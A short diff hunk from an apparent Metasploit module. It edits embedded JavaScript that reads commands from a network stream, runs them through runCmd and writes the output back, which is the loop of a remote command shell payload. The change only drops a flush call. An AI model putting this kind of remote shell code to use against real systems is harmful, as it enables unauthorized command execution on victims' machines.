@@ -64,7 +64,6 @@ module Metasploit3
           var data = NetUtil.readInputStreamToString(stream, count).trim();
           var output = runCmd(data);
           outStream.write(output[0], output[0].length);
-          outStream.flush();
         }
       };
 
